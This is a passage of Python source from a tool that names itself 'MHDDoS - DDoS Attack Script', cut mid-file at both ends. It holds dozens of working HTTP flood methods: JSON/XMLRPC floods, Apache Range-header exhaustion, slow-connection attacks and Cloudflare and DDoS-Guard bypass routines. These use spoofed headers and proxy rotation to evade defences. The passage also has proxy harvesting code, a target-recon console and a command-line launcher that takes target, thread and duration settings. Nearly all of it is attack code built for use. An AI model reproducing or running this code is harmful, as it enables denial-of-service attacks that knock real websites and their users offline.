{randchoice(self._useragents)}\\r\\n\"\n                f\"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\\r\\n\" +\n                self.SpoofIP)\n\n    @staticmethod\n    def getMethodType(method: str) -> str:\n        return \"GET\" if {method.upper()} & {\"CFB\", \"CFBUAM\", \"GET\", \"TOR\", \"COOKIE\", \"OVH\", \"EVEN\",\n                                            \"DYN\", \"SLOW\", \"PPS\", \"APACHE\",\n                                            \"BOT\", \"RHEX\", \"STOMP\"} \\\n            else \"POST\" if {method.upper()} & {\"POST\", \"XMLRPC\", \"STRESS\"} \\\n            else \"HEAD\" if {method.upper()} & {\"GSB\", \"HEAD\"} \\\n            else \"REQUESTS\"\n\n    def POST(self) -> None:\n        payload: bytes = self.generate_payload(\n            (\"Content-Length: 44\\r\\n\"\n             \"X-Requested-With: XMLHttpRequest\\r\\n\"\n             \"Content-Type: application/json\\r\\n\\r\\n\"\n             '{\"data\": %s}') % ProxyTools.Random.rand_str(32))[:-2]\n        s = None\n        with  suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def TOR(self) -> None:\n        provider = \".\" + randchoice(tor2webs)\n        target = self._target.authority.replace(\".onion\", provider)\n        payload: Any = str.encode(self._payload +\n                                  f\"Host: {target}\\r\\n\" +\n                                  self.randHeadercontent +\n                                  \"\\r\\n\")\n        s = None\n        target = self._target.host.replace(\".onion\", provider), self._raw_target[1]\n        with suppress(Exception), self.open_connection(target) as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def STRESS(self) -> None:\n        payload: bytes = self.generate_payload(\n            (\"Content-Length: 524\\r\\n\"\n             \"X-Requested-With: XMLHttpRequest\\r\\n\"\n             \"Content-Type: application/json\\r\\n\\r\\n\"\n             '{\"data\": %s}') % ProxyTools.Random.rand_str(512))[:-2]\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def COOKIES(self) -> None:\n        payload: bytes = self.generate_payload(\n            \"Cookie: _ga=GA%s;\"\n            \" _gat=1;\"\n            \" __cfduid=dc232334gwdsd23434542342342342475611928;\"\n            \" %s=%s\\r\\n\" %\n            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),\n             ProxyTools.Random.rand_str(32)))\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def APACHE(self) -> None:\n        payload: bytes = self.generate_payload(\n            \"Range: bytes=0-,%s\" % \",\".join(\"5-%d\" % i\n                                            for i in range(1, 1024)))\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def XMLRPC(self) -> None:\n        payload: bytes = self.generate_payload(\n            (\"Content-Length: 345\\r\\n\"\n             \"X-Requested-With: XMLHttpRequest\\r\\n\"\n             \"Content-Type: application/xml\\r\\n\\r\\n\"\n             \"<?xml version='1.0' encoding='iso-8859-1'?>\"\n             \"<methodCall><methodName>pingback.ping</methodName>\"\n             \"<params><param><value><string>%s</string></value>\"\n             \"</param><param><value><string>%s</string>\"\n             \"</value></param></params></methodCall>\") %\n            (ProxyTools.Random.rand_str(64),\n             ProxyTools.Random.rand_str(64)))[:-2]\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def PPS(self) -> None:\n        payload: Any = str.encode(self._defaultpayload +\n                                  f\"Host: {self._target.authority}\\r\\n\\r\\n\")\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def KILLER(self) -> None:\n        while True:\n            Thread(target=self.GET, daemon=True).start()\n\n    def GET(self) -> None:\n        payload: bytes = self.generate_payload()\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def BOT(self) -> None:\n        payload: bytes = self.generate_payload()\n        p1, p2 = str.encode(\n            \"GET /robots.txt HTTP/1.1\\r\\n\"\n            \"Host: %s\\r\\n\" % self._target.raw_authority +\n            \"Connection: Keep-Alive\\r\\n\"\n            \"Accept: text/plain,text/html,*/*\\r\\n\"\n            \"User-Agent: %s\\r\\n\" % randchoice(google_agents) +\n            \"Accept-Encoding: gzip,deflate,br\\r\\n\\r\\n\"), str.encode(\n            \"GET /sitemap.xml HTTP/1.1\\r\\n\"\n            \"Host: %s\\r\\n\" % self._target.raw_authority +\n            \"Connection: Keep-Alive\\r\\n\"\n            \"Accept: */*\\r\\n\"\n            \"From: googlebot(at)googlebot.com\\r\\n\"\n            \"User-Agent: %s\\r\\n\" % randchoice(google_agents) +\n            \"Accept-Encoding: gzip,deflate,br\\r\\n\"\n            \"If-None-Match: %s-%s\\r\\n\" % (ProxyTools.Random.rand_str(9),\n                                          ProxyTools.Random.rand_str(4)) +\n            \"If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\\r\\n\\r\\n\")\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            Tools.send(s, p1)\n            Tools.send(s, p2)\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def EVEN(self) -> None:\n        payload: bytes = self.generate_payload()\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            while Tools.send(s, payload) and s.recv(1):\n                continue\n        Tools.safe_close(s)\n\n    def OVH(self) -> None:\n        payload: bytes = self.generate_payload()\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(min(self._rpc, 5)):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def CFB(self):\n        global REQUESTS_SENT, BYTES_SEND\n        pro = None\n        if self._proxies:\n            pro = randchoice(self._proxies)\n        s = None\n        with suppress(Exception), create_scraper() as s:\n            for _ in range(self._rpc):\n                if pro:\n                    with s.get(self._target.human_repr(),\n                               proxies=pro.asRequest()) as res:\n                        REQUESTS_SENT += 1\n                        BYTES_SEND += Tools.sizeOfRequest(res)\n                        continue\n\n                with s.get(self._target.human_repr()) as res:\n                    REQUESTS_SENT += 1\n                    BYTES_SEND += Tools.sizeOfRequest(res)\n        Tools.safe_close(s)\n\n    def CFBUAM(self):\n        payload: bytes = self.generate_payload()\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            Tools.send(s, payload)\n            sleep(5.01)\n            ts = time()\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n                if time() > ts + 120: break\n        Tools.safe_close(s)\n\n    def AVB(self):\n        payload: bytes = self.generate_payload()\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                sleep(max(self._rpc / 1000, 1))\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def DGB(self):\n        global REQUESTS_SENT, BYTES_SEND\n        with suppress(Exception):\n            if self._proxies:\n                pro = randchoice(self._proxies)\n                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:\n                    for _ in range(min(self._rpc, 5)):\n                        sleep(min(self._rpc, 5) / 100)\n                        with ss.get(self._target.human_repr(),\n                                    proxies=pro.asRequest()) as res:\n                            REQUESTS_SENT += 1\n                            BYTES_SEND += Tools.sizeOfRequest(res)\n                            continue\n\n                Tools.safe_close(ss)\n\n            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:\n                for _ in range(min(self._rpc, 5)):\n                    sleep(min(self._rpc, 5) / 100)\n                    with ss.get(self._target.human_repr()) as res:\n                        REQUESTS_SENT += 1\n                        BYTES_SEND += Tools.sizeOfRequest(res)\n\n            Tools.safe_close(ss)\n\n    def DYN(self):\n        payload: Any = str.encode(self._payload +\n                                  f\"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\\r\\n\" +\n                                  self.randHeadercontent +\n                                  \"\\r\\n\")\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def DOWNLOADER(self):\n        payload: Any = self.generate_payload()\n\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n                while 1:\n                    sleep(.01)\n                    data = s.recv(1)\n                    if not data:\n                        break\n            Tools.send(s, b'0')\n        Tools.safe_close(s)\n\n    def BYPASS(self):\n        global REQUESTS_SENT, BYTES_SEND\n        pro = None\n        if self._proxies:\n            pro = randchoice(self._proxies)\n        s = None\n        with suppress(Exception), Session() as s:\n            for _ in range(self._rpc):\n                if pro:\n                    with s.get(self._target.human_repr(),\n                               proxies=pro.asRequest()) as res:\n                        REQUESTS_SENT += 1\n                        BYTES_SEND += Tools.sizeOfRequest(res)\n                        continue\n\n                with s.get(self._target.human_repr()) as res:\n                    REQUESTS_SENT += 1\n                    BYTES_SEND += Tools.sizeOfRequest(res)\n        Tools.safe_close(s)\n\n    def GSB(self):\n        payload = str.encode(\"%s %s?qs=%s HTTP/1.1\\r\\n\" % (self._req_type,\n                                                           self._target.raw_path_qs,\n                                                           ProxyTools.Random.rand_str(6)) +\n                             \"Host: %s\\r\\n\" % self._target.authority +\n                             self.randHeadercontent +\n                             'Accept-Encoding: gzip, deflate, br\\r\\n'\n                             'Accept-Language: en-US,en;q=0.9\\r\\n'\n                             'Cache-Control: max-age=0\\r\\n'\n                             'Connection: Keep-Alive\\r\\n'\n                             'Sec-Fetch-Dest: document\\r\\n'\n                             'Sec-Fetch-Mode: navigate\\r\\n'\n                             'Sec-Fetch-Site: none\\r\\n'\n                             'Sec-Fetch-User: ?1\\r\\n'\n                             'Sec-Gpc: 1\\r\\n'\n                             'Pragma: no-cache\\r\\n'\n                             'Upgrade-Insecure-Requests: 1\\r\\n\\r\\n')\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def RHEX(self):\n        randhex = str(randbytes(randchoice([32, 64, 128])))\n        payload = str.encode(\"%s %s/%s HTTP/1.1\\r\\n\" % (self._req_type,\n                                                        self._target.authority,\n                                                        randhex) +\n                             \"Host: %s/%s\\r\\n\" % (self._target.authority, randhex) +\n                             self.randHeadercontent +\n                             'Accept-Encoding: gzip, deflate, br\\r\\n'\n                             'Accept-Language: en-US,en;q=0.9\\r\\n'\n                             'Cache-Control: max-age=0\\r\\n'\n                             'Connection: keep-alive\\r\\n'\n                             'Sec-Fetch-Dest: document\\r\\n'\n                             'Sec-Fetch-Mode: navigate\\r\\n'\n                             'Sec-Fetch-Site: none\\r\\n'\n                             'Sec-Fetch-User: ?1\\r\\n'\n                             'Sec-Gpc: 1\\r\\n'\n                             'Pragma: no-cache\\r\\n'\n                             'Upgrade-Insecure-Requests: 1\\r\\n\\r\\n')\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def STOMP(self):\n        dep = ('Accept-Encoding: gzip, deflate, br\\r\\n'\n               'Accept-Language: en-US,en;q=0.9\\r\\n'\n               'Cache-Control: max-age=0\\r\\n'\n               'Connection: keep-alive\\r\\n'\n               'Sec-Fetch-Dest: document\\r\\n'\n               'Sec-Fetch-Mode: navigate\\r\\n'\n               'Sec-Fetch-Site: none\\r\\n'\n               'Sec-Fetch-User: ?1\\r\\n'\n               'Sec-Gpc: 1\\r\\n'\n               'Pragma: no-cache\\r\\n'\n               'Upgrade-Insecure-Requests: 1\\r\\n\\r\\n')\n        hexh = r'\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87' \\\n               r'\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F' \\\n               r'\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F' \\\n               r'\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84' \\\n               r'\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F' \\\n               r'\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98' \\\n               r'\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98' \\\n               r'\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B' \\\n               r'\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99' \\\n               r'\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C' \\\n               r'\\x8F\\x98\\xEA\\x84\\x8B\\x87\\x8F\\x99\\x8F\\x98\\x9C\\x8F\\x98\\xEA '\n        p1, p2 = str.encode(\"%s %s/%s HTTP/1.1\\r\\n\" % (self._req_type,\n                                                       self._target.authority,\n                                                       hexh) +\n                            \"Host: %s/%s\\r\\n\" % (self._target.authority, hexh) +\n                            self.randHeadercontent + dep), str.encode(\n            \"%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\\r\\n\" % (self._req_type,\n                                                          self._target.authority) +\n            \"Host: %s\\r\\n\" % hexh +\n            self.randHeadercontent + dep)\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            Tools.send(s, p1)\n            for _ in range(self._rpc):\n                Tools.send(s, p2)\n        Tools.safe_close(s)\n\n    def NULL(self) -> None:\n        payload: Any = str.encode(self._payload +\n                                  f\"Host: {self._target.authority}\\r\\n\" +\n                                  \"User-Agent: null\\r\\n\" +\n                                  \"Referrer: null\\r\\n\" +\n                                  self.SpoofIP + \"\\r\\n\")\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n        Tools.safe_close(s)\n\n    def BOMB(self):\n        assert self._proxies, \\\n            'This method requires proxies. ' \\\n            'Without proxies you can use github.com/codesenberg/bombardier'\n\n        while True:\n            proxy = randchoice(self._proxies)\n            if proxy.type != ProxyType.SOCKS4:\n                break\n\n        res = run(\n            [\n                f'{bombardier_path}',\n                f'--connections={self._rpc}',\n                '--http2',\n                '--method=GET',\n                '--latencies',\n                '--timeout=30s',\n                f'--requests={self._rpc}',\n                f'--proxy={proxy}',\n                f'{self._target.human_repr()}',\n            ],\n            stdout=PIPE,\n        )\n        if self._thread_id == 0:\n            print(proxy, res.stdout.decode(), sep='\\n')\n\n    def SLOW(self):\n        payload: bytes = self.generate_payload()\n        s = None\n        with suppress(Exception), self.open_connection() as s:\n            for _ in range(self._rpc):\n                Tools.send(s, payload)\n            while Tools.send(s, payload) and s.recv(1):\n                for i in range(self._rpc):\n                    keep = str.encode(\"X-a: %d\\r\\n\" % ProxyTools.Random.rand_int(1, 5000))\n                    Tools.send(s, keep)\n                    sleep(self._rpc / 15)\n                    break\n        Tools.safe_close(s)\n\n\nclass ProxyManager:\n\n    @staticmethod\n    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:\n        providrs = [\n            provider for provider in cf[\"proxy-providers\"]\n            if provider[\"type\"] == Proxy_type or Proxy_type == 0\n        ]\n        logger.info(\n            f\"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}\" % len(\n                providrs))\n        proxes: Set[Proxy] = set()\n\n        with ThreadPoolExecutor(len(providrs)) as executor:\n            future_to_download = {\n                executor.submit(\n                    ProxyManager.download, provider,\n                    ProxyType.stringToProxyType(str(provider[\"type\"])))\n                for provider in providrs\n            }\n            for future in as_completed(future_to_download):\n                for pro in future.result():\n                    proxes.add(pro)\n        return proxes\n\n    @staticmethod\n    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:\n        logger.debug(\n            f\"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}\" %\n            (provider[\"url\"], proxy_type.name, provider[\"timeout\"]))\n        proxes: Set[Proxy] = set()\n        with suppress(TimeoutError, exceptions.ConnectionError,\n                      exceptions.ReadTimeout):\n            data = get(provider[\"url\"], timeout=provider[\"timeout\"]).text\n            try:\n                for proxy in ProxyUtiles.parseAllIPPort(\n                        data.splitlines(), proxy_type):\n                    proxes.add(proxy)\n            except Exception as e:\n                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')\n        return proxes\n\n\nclass ToolsConsole:\n    METHODS = {\"INFO\", \"TSSRV\", \"CFIP\", \"DNS\", \"PING\", \"CHECK\", \"DSTAT\"}\n\n    @staticmethod\n    def checkRawSocket():\n        with suppress(OSError):\n            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):\n                return True\n        return False\n\n    @staticmethod\n    def runConsole():\n        cons = f\"{gethostname()}@MHTools:~#\"\n\n        while 1:\n            cmd = input(cons + \" \").strip()\n            if not cmd: continue\n            if \" \" in cmd:\n                cmd, args = cmd.split(\" \", 1)\n\n            cmd = cmd.upper()\n            if cmd == \"HELP\":\n                print(\"Tools:\" + \", \".join(ToolsConsole.METHODS))\n                print(\"Commands: HELP, CLEAR, BACK, EXIT\")\n                continue\n\n            if {cmd} & {\"E\", \"EXIT\", \"Q\", \"QUIT\", \"LOGOUT\", \"CLOSE\"}:\n                exit(-1)\n\n            if cmd == \"CLEAR\":\n                print(\"\\033c\")\n                continue\n\n            if not {cmd} & ToolsConsole.METHODS:\n                print(f\"{cmd} command not found\")\n                continue\n\n            if cmd == \"DSTAT\":\n                with suppress(KeyboardInterrupt):\n                    ld = net_io_counters(pernic=False)\n\n                    while True:\n                        sleep(1)\n\n                        od = ld\n                        ld = net_io_counters(pernic=False)\n\n                        t = [(last - now) for now, last in zip(od, ld)]\n\n                        logger.info(\n                            (\"Bytes Sent %s\\n\"\n                             \"Bytes Received %s\\n\"\n                             \"Packets Sent %s\\n\"\n                             \"Packets Received %s\\n\"\n                             \"ErrIn %s\\n\"\n                             \"ErrOut %s\\n\"\n                             \"DropIn %s\\n\"\n                             \"DropOut %s\\n\"\n                             \"Cpu Usage %s\\n\"\n                             \"Memory %s\\n\") %\n                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),\n                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),\n                             t[4], t[5], t[6], t[7], str(cpu_percent()) + \"%\",\n                             str(virtual_memory().percent) + \"%\"))\n            if cmd in [\"CFIP\", \"DNS\"]:\n                print(\"Soon\")\n                continue\n\n            if cmd == \"CHECK\":\n                while True:\n                    with suppress(Exception):\n                        domain = input(f'{cons}give-me-ipaddress# ')\n                        if not domain: continue\n                        if domain.upper() == \"BACK\": break\n                        if domain.upper() == \"CLEAR\":\n                            print(\"\\033c\")\n                            continue\n                        if {domain.upper()} & {\"E\", \"EXIT\", \"Q\", \"QUIT\", \"LOGOUT\", \"CLOSE\"}:\n                            exit(-1)\n                        if \"/\" not in domain: continue\n                        logger.info(\"please wait ...\")\n\n                        with get(domain, timeout=20) as r:\n                            logger.info(('status_code: %d\\n'\n                                         'status: %s') %\n                                        (r.status_code, \"ONLINE\"\n                                        if r.status_code <= 500 else \"OFFLINE\"))\n\n            if cmd == \"INFO\":\n                while True:\n                    domain = input(f'{cons}give-me-ipaddress# ')\n                    if not domain: continue\n                    if domain.upper() == \"BACK\": break\n                    if domain.upper() == \"CLEAR\":\n                        print(\"\\033c\")\n                        continue\n                    if {domain.upper()} & {\"E\", \"EXIT\", \"Q\", \"QUIT\", \"LOGOUT\", \"CLOSE\"}:\n                        exit(-1)\n                    domain = domain.replace('https://',\n                                            '').replace('http://', '')\n                    if \"/\" in domain: domain = domain.split(\"/\")[0]\n                    print('please wait ...', end=\"\\r\")\n\n                    info = ToolsConsole.info(domain)\n\n                    if not info[\"success\"]:\n                        print(\"Error!\")\n                        continue\n\n                    logger.info((\"Country: %s\\n\"\n                                 \"City: %s\\n\"\n                                 \"Org: %s\\n\"\n                                 \"Isp: %s\\n\"\n                                 \"Region: %s\\n\") %\n                                (info[\"country\"], info[\"city\"], info[\"org\"],\n                                 info[\"isp\"], info[\"region\"]))\n\n            if cmd == \"TSSRV\":\n                while True:\n                    domain = input(f'{cons}give-me-domain# ')\n                    if not domain: continue\n                    if domain.upper() == \"BACK\": break\n                    if domain.upper() == \"CLEAR\":\n                        print(\"\\033c\")\n                        continue\n                    if {domain.upper()} & {\"E\", \"EXIT\", \"Q\", \"QUIT\", \"LOGOUT\", \"CLOSE\"}:\n                        exit(-1)\n                    domain = domain.replace('https://',\n                                            '').replace('http://', '')\n                    if \"/\" in domain: domain = domain.split(\"/\")[0]\n                    print('please wait ...', end=\"\\r\")\n\n                    info = ToolsConsole.ts_srv(domain)\n                    logger.info(f\"TCP: {(info['_tsdns._tcp.'])}\\n\")\n                    logger.info(f\"UDP: {(info['_ts3._udp.'])}\\n\")\n\n            if cmd == \"PING\":\n                while True:\n                    domain = input(f'{cons}give-me-ipaddress# ')\n                    if not domain: continue\n                    if domain.upper() == \"BACK\": break\n                    if domain.upper() == \"CLEAR\":\n                        print(\"\\033c\")\n                    if {domain.upper()} & {\"E\", \"EXIT\", \"Q\", \"QUIT\", \"LOGOUT\", \"CLOSE\"}:\n                        exit(-1)\n\n                    domain = domain.replace('https://',\n                                            '').replace('http://', '')\n                    if \"/\" in domain: domain = domain.split(\"/\")[0]\n\n                    logger.info(\"please wait ...\")\n                    r = ping(domain, count=5, interval=0.2)\n                    logger.info(('Address: %s\\n'\n                                 'Ping: %d\\n'\n                                 'Aceepted Packets: %d/%d\\n'\n                                 'status: %s\\n') %\n                                (r.address, r.avg_rtt, r.packets_received,\n                                 r.packets_sent,\n                                 \"ONLINE\" if r.is_alive else \"OFFLINE\"))\n\n    @staticmethod\n    def stop():\n        print('All Attacks has been Stopped !')\n        for proc in process_iter():\n            if proc.name() == \"python.exe\":\n                proc.kill()\n\n    @staticmethod\n    def usage():\n        print((\n                  '* MHDDoS - DDoS Attack Script With %d Methods\\n'\n                  'Note: If the Proxy list is empty, The attack will run without proxies\\n'\n                  '      If the Proxy file doesn\\'t exist, the script will download proxies and check them.\\n'\n                  '      Proxy Type 0 = All in config.json\\n'\n                  '      SocksTypes:\\n'\n                  '         - 6 = RANDOM\\n'\n                  '         - 5 = SOCKS5\\n'\n                  '         - 4 = SOCKS4\\n'\n                  '         - 1 = HTTP\\n'\n                  '         - 0 = ALL\\n'\n                  ' > Methods:\\n'\n                  ' - Layer4\\n'\n                  ' | %s | %d Methods\\n'\n                  ' - Layer7\\n'\n                  ' | %s | %d Methods\\n'\n                  ' - Tools\\n'\n                  ' | %s | %d Methods\\n'\n                  ' - Others\\n'\n                  ' | %s | %d Methods\\n'\n                  ' - All %d Methods\\n'\n                  '\\n'\n                  'Example:\\n'\n                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\\n'\n                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\\n'\n                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\\n'\n                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'\n                  ' Amplification)>\\n') %\n              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),\n               \", \".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),\n               \", \".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),\n               \", \".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),\n               \", \".join([\"TOOLS\", \"HELP\", \"STOP\"]), 3,\n               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),\n               argv[0], argv[0], argv[0], argv[0]))\n\n    # noinspection PyBroadException\n    @staticmethod\n    def ts_srv(domain):\n        records = ['_ts3._udp.', '_tsdns._tcp.']\n        DnsResolver = resolver.Resolver()\n        DnsResolver.timeout = 1\n        DnsResolver.lifetime = 1\n        Info = {}\n        for rec in records:\n            try:\n                srv_records = resolver.resolve(rec + domain, 'SRV')\n                for srv in srv_records:\n                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(\n                        srv.port)\n            except:\n                Info[rec] = 'Not found'\n\n        return Info\n\n    # noinspection PyUnreachableCode\n    @staticmethod\n    def info(domain):\n        with suppress(Exception), get(f\"https://ipwhois.app/json/{domain}/\") as s:\n            return s.json()\n        return {\"success\": False}\n\n\ndef handleProxyList(con, proxy_li, proxy_ty, url=None):\n    if proxy_ty not in {4, 5, 1, 0, 6}:\n        exit(\"Socks Type Not Found [4, 5, 1, 0, 6]\")\n    if proxy_ty == 6:\n        proxy_ty = randchoice([4, 5, 1])\n    if not proxy_li.exists():\n        logger.warning(\n            f\"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}\")\n        proxy_li.parent.mkdir(parents=True, exist_ok=True)\n        with proxy_li.open(\"w\") as wr:\n            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)\n            logger.info(\n                f\"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!\"\n            )\n            Proxies = ProxyChecker.checkAll(\n                Proxies, timeout=5, threads=threads,\n                url=url.human_repr() if url else \"http://httpbin.org/get\",\n            )\n\n            if not Proxies:\n                exit(\n                    \"Proxy Check failed, Your network may be the problem\"\n                    \" | The target may not be available.\"\n                )\n            stringBuilder = \"\"\n            for proxy in Proxies:\n                stringBuilder += (proxy.__str__() + \"\\n\")\n            wr.write(stringBuilder)\n\n    proxies = ProxyUtiles.readFromFile(proxy_li)\n    if proxies:\n        logger.info(f\"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}\")\n    else:\n        logger.info(\n            f\"{bcolors.WARNING}Empty Proxy File, running flood without proxy{bcolors.RESET}\")\n        proxies = None\n\n    return proxies\n\n\nif __name__ == '__main__':\n    with suppress(KeyboardInterrupt):\n        with suppress(IndexError):\n            one = argv[1].upper()\n\n            if one == \"HELP\":\n                raise IndexError()\n            if one == \"TOOLS\":\n                ToolsConsole.runConsole()\n            if one == \"STOP\":\n                ToolsConsole.stop()\n\n            method = one\n            host = None\n            port = None\n            url = None\n            event = Event()\n            event.clear()\n            target = None\n            urlraw = argv[2].strip()\n            if not urlraw.startswith(\"http\"):\n                urlraw = \"http://\" + urlraw\n\n            if method not in Methods.ALL_METHODS:\n                exit(\"Method Not Found %s\" %\n                     \", \".join(Methods.ALL_METHODS))\n\n            if method in Methods.LAYER7_METHODS:\n                url = URL(urlraw)\n                host = url.host\n\n                if method != \"TOR\":\n                    try:\n                        host = gethostbyname(url.host)\n                    except Exception as e:\n                        exit('Cannot resolve hostname ', url.host, str(e))\n\n                threads = int(argv[4])\n                rpc = int(argv[6])\n                timer = int(argv[7])\n                proxy_ty = int(argv[3].strip())\n                proxy_li = Path(__dir__ / \"files/proxies/\" /\n                                argv[5].strip())\n                useragent_li = Path(__dir__ / \"files/useragent.txt\")\n                referers_li = Path(__dir__ / \"files/referers.txt\")\n                bombardier_path = Path.home() / \"go/bin/bombardier\"\n                proxies: Any = set()\n\n                if method == \"BOMB\":\n                    assert (\n                            bombardier_path.exists()\n                            or bombardier_path.with_suffix('.exe').exists()\n                    ), (\n                        \"Install bombardier: \"\n                        \"https://github.com/MHProDev/MHDDoS/wiki/BOMB-method\"\n                    )\n\n                if len(argv) == 9:\n                    logger.setLevel(\"DEBUG\")\n\n                if not useragent_li.exists():\n                    exit(\"The Useragent file doesn't exist \")\n                if not referers_li.exists():\n                    exit(\"The Referer file doesn't exist \")\n\n                uagents = set(a.strip()\n                              for a in useragent_li.open(\"r+\").readlines())\n                referers = set(a.strip()\n                               for a in referers_li.open(\"r+\").readlines())\n\n                if not uagents: exit(\"Empty Useragent File \")\n                if not referers: exit(\"Empty Referer File \")\n\n                if threads > 1000:\n                    logger.warning(\"Thread is higher than 1000\")\n                if rpc > 100:\n                    logger.warning(\n                        \"RPC (Request Pre Connection) is higher than 100\")\n\n                proxies = handleProxyList(con, proxy_li, proxy_ty, url)\n                for thread_id in range(threads):\n                    